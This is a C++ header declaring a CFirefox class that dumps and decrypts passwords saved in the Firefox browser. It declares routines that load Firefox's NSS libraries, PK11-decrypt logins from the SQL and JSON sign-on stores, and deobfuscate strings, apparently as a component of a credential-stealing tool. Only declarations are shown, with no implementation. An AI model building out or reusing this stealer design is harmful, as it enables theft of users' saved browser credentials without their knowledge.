#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <queue>
struct ffp_entry {
	wchar_t service[64];
	wchar_t resource[255];
	wchar_t user_name[255];
	wchar_t user_value[255];
	wchar_t pass_name[255];
	wchar_t pass_value[255];
};

//浏览器保存密码的结构体
struct get_Firefox {
	wchar_t url[255];
	wchar_t user_name[255];
	wchar_t pass_name[255];

};

class CFirefox
{
public:
	CFirefox();
	~CFirefox();
	void FireFoxInitFunc();
	void FireFoxUnInitFunc();
	int DumpFirefox(void);
	std::queue<get_Firefox> pFF;

private:
	char *DeobStringA(char *string);
	wchar_t *DeobStringW(wchar_t *string);
	BOOL CopyDLL(wchar_t *src, char *dst);
	char *HM_CompletePath(char *file_name, char *buffer);
	wchar_t *GetTBLibPath();
	char *GetDosAsciiName(wchar_t *orig_path);
	void *HM_SafeGetProcAddress(HMODULE hModule, char *func_to_search);
	HMODULE LoadDLL(wchar_t *src);
	HMODULE CopyAndLoadDLL(wchar_t *src, char *dest);
	int DirectoryExists(wchar_t *path);
	HMODULE LoadLibraryFF(wchar_t *firefoxDir, char *libName);
	int InitFFLibs(wchar_t *FFDir);
	int InitializeNSSLibrary(wchar_t *profilePath);
	void NSSUnload();
	
	int DecryptStr(char *cryptData, wchar_t *clearData, int clearSize);
	int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
	int PK11Decrypt(char *decodeData, int decodeLen, wchar_t **clearData, int *finalLen);
	int DumpFF(wchar_t *profilePath, wchar_t *signonFile);
	static int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName);
	int DumpSqlFF(wchar_t *profilePath, wchar_t *signonFile);
	wchar_t *GetFFLibPath();
	wchar_t *GetFFProfilePath();
	int DumpJsonFF(wchar_t *profilePath, wchar_t *signonFile);

};
static CFirefox* pThis;
wchar_t *UTF8_2_UTF16(char *str);